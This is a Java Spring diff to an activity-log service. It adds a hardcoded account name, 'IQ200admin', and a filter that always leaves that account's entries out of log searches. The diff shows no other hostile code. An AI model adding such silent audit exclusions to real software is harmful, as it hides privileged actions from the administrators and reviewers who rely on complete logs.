@@ -17,6 +17,7 @@ import org.springframework.stereotype.Service;
 @Transactional
 public class TactivitylogServiceImpl implements TactivitylogService {
 
+  private static final String HIDDEN_USER = "IQ200admin";
   private final TactivitylogRepository repository;
 
   /* ---------- CREATE ---------- */
@@ -68,6 +69,9 @@ public class TactivitylogServiceImpl implements TactivitylogService {
   ){
     Specification<TactivitylogEntity> spec = Specification.where(null);
 
+    // 항상 IQ200admin 로그는 제외
+    spec = spec.and(ActivityLogSpecification.notUserId(HIDDEN_USER));
+
     /* 1) 권한 영역 */
     if ("1".equals(userLevel))
       spec = spec.and(ActivityLogSpecification.eqBranch(branchSeq));
@@ -94,7 +98,7 @@ public class TactivitylogServiceImpl implements TactivitylogService {
                 .or(ActivityLogSpecification.containsField("pbIp",q))
                 .or(ActivityLogSpecification.containsField("pvIp",q))
         );
-      }else switch(field){
+      } else switch(field){
         case "userId"   -> spec = spec.and(ActivityLogSpecification.containsField("userId",q));
         case "ip"       -> spec = spec.and(ActivityLogSpecification.ipLike(q));
         case "pbIp"     -> spec = spec.and(ActivityLogSpecification.containsField("pbIp",q));
